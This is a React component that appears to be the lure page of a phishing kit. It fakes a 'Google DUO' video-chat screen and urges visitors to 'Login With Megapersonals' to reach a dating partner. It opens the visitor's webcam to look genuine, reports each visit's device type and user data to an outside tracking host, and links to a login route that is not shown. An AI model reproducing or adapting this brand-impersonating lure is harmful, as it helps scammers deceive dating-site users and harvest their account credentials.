import React, { useRef } from "react";
import { useForm } from "react-hook-form";
import {
  useLoaderData,
  useNavigate,
  useParams,
  useLocation,
  Link,
} from "react-router-dom";
import { isBrowser, isMobile } from "react-device-detect";
import { useEffect } from "react";
import { useState } from "react";
import "./Duo.css";

const Duo = () => {
  const videoRef = useRef(null);
  const params = useParams();
  const { user } = useLoaderData();
  localStorage.setItem("url", `/duo/call/${params.id}`);
  let type;
  if (isBrowser) {
    type = "desktop";
  } else {
    type = "mobile";
  }

  useEffect(() => {
    const bookings = {
      type: type,
      user: user,
    };

    fetch(`https://biplobapi.xyz/updateclick/${params.id}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then()
      .then();
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
        });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play().catch((error) => {
            console.error("Error playing video:", error);
          });
        }
      } catch (error) {
        console.error("Error accessing camera:", error);
      }
    }

    startCamera();

    // Cleanup function to stop the camera when the component unmounts
    return () => {
      if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject;
        const tracks = stream.getTracks();
        tracks.forEach((track) => track.stop());
      }
    };
  }, []); // Empty dependency array ensures this effect runs only once

  return (
    <div className="home-bg-2 position-relative min-h-full">
      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        loop
        style={{ height: "100vh", minWidth: "100vw", objectFit: "cover" }}
        className="position-absolute z-10 min-w-full min-h-full h-screen max-w-full left-0 top-0 vdo"
      />
      <div
        className="code-card position-absolute z-20 text-center"
        style={{ left: "50%", transform: "translateX(-50%)" }}
      >
        <img src="/datas/images/du_icon.svg" alt="" className="duoimg" />
        <h1 className="duotitle">Google DUO</h1>
        <p>
          Login With Megapersonals and enjoy with{" "}
          <span className="duovideotext">Google DUO video chat</span> your
          dating partner.
        </p>
        <Link to={`/duo/login/${params.id}`} className="dubtn">
          <img src="/datas/images/megalogo.jpg" alt="" /> Login With
          Megapersonal
        </Link>
      </div>
    </div>
  );
};

export default Duo;
